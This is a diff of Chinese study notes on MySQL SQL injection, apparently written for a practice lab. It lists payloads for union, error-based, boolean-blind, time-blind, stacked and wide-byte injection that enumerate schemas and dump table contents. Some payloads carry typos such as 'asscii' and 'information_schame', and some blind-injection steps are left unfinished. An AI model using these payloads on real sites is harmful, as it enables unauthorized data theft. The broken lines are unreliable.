@@ -19,8 +19,10 @@
 ## 五、重点谈一谈MySQL注入：
 ### 1、联合注入：
 ***（1）判断是否有注入及注入点的类型</br>***
+···
 是否有注入：加单引号，and 111=111，and ’1’=’1’，and 1=2，or 1=1，or 1=2</br>
 注入点类型：字符型（’，”，’），”)，%’），数字型</br>
+```
 ***（2）判断查询列数（order by）***
 原理order by 是排序的语句：</br>
 ```SQL
@@ -42,29 +44,31 @@ user()  当前网站使用的数据库账户
 @@datadir  数据库安装目录：phpstudy（c:\phpstudy\mysql;c:\phpstudy\www）、wamp（c:\wamp\mysql;c:\wamp\www）
 ```
 ***（5）获取数据库名***
-information_schema数据库（schemata表、tables表、columns表）；</br>
-schemata表里面获取数据库名：</br>
+information_schema数据库（schemata表、tables表、columns表）；
+schemata表里面获取数据库名：
 ```
 select schema_name from schemata;
 id=1' union select 1,2,group_concat(schema_name) from information_schema.schemata
 ```
 ***（6）获取表名（tables表）***
 ```
-select table_name from tables where table_schema='security';</br>
-select table_name from tables where table_schema=database();</br>
-id=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</br>
+select table_name from tables where table_schema='security';
+select table_name from tables where table_schema=database();
+id=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
 ```
 ***（7）获取列名（columns表）***
 ```
-select column_name from columns where table_schema='security' and table_name='users';</br>
+select column_name from columns where table_schema='security' and table_name='users';
 ```
 ***（8）优化步骤***
 ```
-select table_name,column_name from columns where table_schema='security';</br>
-id=1' union select 1,2,group_concat(table_name,'_',column_name) from information_schema.columns where table_schema=database()</br>
+select table_name,column_name from columns where table_schema='security';
+id=1' union select 1,2,group_concat(table_name,'_',column_name) from information_schema.columns where table_schema=database()
 ```
 ***（9）获取数据***
+```
   --dump</br>
+```
 ### 2、报错注入：
 报错注入语句(本查询结果基于数据库security下的表) （updatexml/ extractvalue）</br>
 1#查询数据库名字（用户user()；版本version()）</br>
@@ -73,36 +77,36 @@ id=1' union select 1,2,group_concat(table_name,'_',column_name) from information
 ```
 2#查询数据库有多少个表</br>
 ```
-?id=1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))%23</br>
+?id=1' and extractvalue(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e))%2
 ```
 3#查询数据库的表名，limit后面第一个数字表示第几个表</br>
 ```
-?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23</br>
+?id=1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))%23
 ```
 4#查询列名，limit后数字表示第几列</br>
 ```
-?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))%23</br>
-?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails'),0x7e))%23</br>
+?id=1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))%23
+?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='emails'),0x7e))%23
 ```
 5#查询表里面某列的内容</br>
 ```
-?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23</br>    
-```      
+?id=1' and extractvalue(1,concat(0x7e,(select group_concat(id) from security.emails),0x7e))%23    
+```
 1#查询数据库名字，数据库名字为security（用户user()；版本version()）</br>
 ```
-?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23    </br>  
-```          
+?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23
+```     
 2#查询数据库有多少个表</br>
 ```
-?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23     </br>   
+?id=1' and updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23  
 ```
 3#查询数据库的表名，limit后第一个数字表示第几个表</br>
 ```
-?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23    </br>   
-```                     
+?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23  
+```                  
 4#查询列名，limit后数字表示第几列</br>
 ```
-?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23  </br>
+?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23
 ```
 5#查询表里面某列的内容</br>
 ```
@@ -111,24 +115,24 @@ id=1' union select 1,2,group_concat(table_name,'_',column_name) from information
 ### 3、布尔盲注：</br>
 1#获得数据库名长度为8</br>
 ```
-?id=1' and (length(database())=8)%23           #有回显</br>
+?id=1' and (length(database())=8)%23           #有回显
 ```
 2#获得数据库名</br>
 ```
-?id=1' and ascii(substr(database(),1,1))<100 %23             #无回显</br>
-?id=1' and ascii(substr(database(),1,1))=115 %23             #有回显</br>
+?id=1' and ascii(substr(database(),1,1))<100 %23             #无回显
+?id=1' and ascii(substr(database(),1,1))=115 %23             #有回显
 ```
 3#获得数据库表名个数</br>
 ```
-?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4%23         #有回显</br>
+?id=1' and (select count(*) from information_schema.tables where table_schema=database())=4%23         #有回显
 ```
 4#获得数据库表名长度</br>
 ```
-?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6%23  </br>
+?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=6%23 
 ```
 5#获得数据库表名</br>
 ```
-?id=1' and ascii((substr ((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)))=106%23</br>
+?id=1' and ascii((substr ((select table_name from information_schema.tables where table_schema=database() limit 0,1),0,1)))=106%23
 ```
 6#获取列名</br>
  </br>
@@ -137,25 +141,25 @@ id=1' union select 1,2,group_concat(table_name,'_',column_name) from information
 ### 4、时间盲注：</br>
 1#获得数据库名长度</br>
 ```
-?id=1' and if((length(database())>5),sleep(5),1)%23        #有时间延迟，说明判断正确</br>
-?id=1' and if((length(database())>9),sleep(5),1)%23        #无时间延迟，说明判断错误</br>
-?id=1' and if((length(database())>5),1,sleep(5))%23        #无时间延迟，说明判断正确</br>
+?id=1' and if((length(database())>5),sleep(5),1)%23        #有时间延迟，说明判断正确
+?id=1' and if((length(database())>9),sleep(5),1)%23        #无时间延迟，说明判断错误
+?id=1' and if((length(database())>5),1,sleep(5))%23        #无时间延迟，说明判断正确
 ```
 2#获得数据库名</br>
 ```
-?id=1' and if((ascii(substr(database(),1,1))>100,sleep(5),1))%23                 #有无回显</br>
+?id=1' and if((ascii(substr(database(),1,1))>100,sleep(5),1))%23                 #有无回显
 ```
 3#获得表名（同理先获取长度）</br>
 ```
-?id=1' and if((asscii(substr((select table_name from information_schame.tables where table_schame=database() limit 0,1),1,1)))>100,sleep(5),1)            #有无回显</br>
+?id=1' and if((asscii(substr((select table_name from information_schame.tables where table_schame=database() limit 0,1),1,1)))>100,sleep(5),1)            #有无回显
 ```
 4#获取数据库列名（先拿列长度？）</br>
 ```
-?id=1' and if</br>
+?id=1' and if
 ```
 5#获取数据</br>
 ```
-?id=1' and if</br>
+?id=1' and if
 ```
 ### 5、堆叠注入：
 mysqli_query函数不支持堆叠注入，mysqli_muiti_query()支持堆叠注入。</br>
@@ -168,7 +172,7 @@ id=1';create table you(id int);#</br>
 虽然用%df能绕过id=1'部分的引号，但是如果后面SQL注入部分出现引号，比较难绕过。比如查询列名的时候，要用到table_name='email'，该语句引号前加%df会使表名出错，无法查询列名。</br>
 解决方法：将表名和列名转换成十六进制，并且在十六进制之前加上0x即可。</br>
 ```
--1%df' union select 1,2,count(table_name) from information_schema.tables where table_schema=0x7365637572697479%23                 #联合注入，查询表数量</br>
+-1%df' union select 1,2,count(table_name) from information_schema.tables where table_schema=0x7365637572697479%23                 #联合注入，查询表数量
 ```
 ### 8、HTTP头注入：
 大多数扫描器发现不了http头注入。</br>
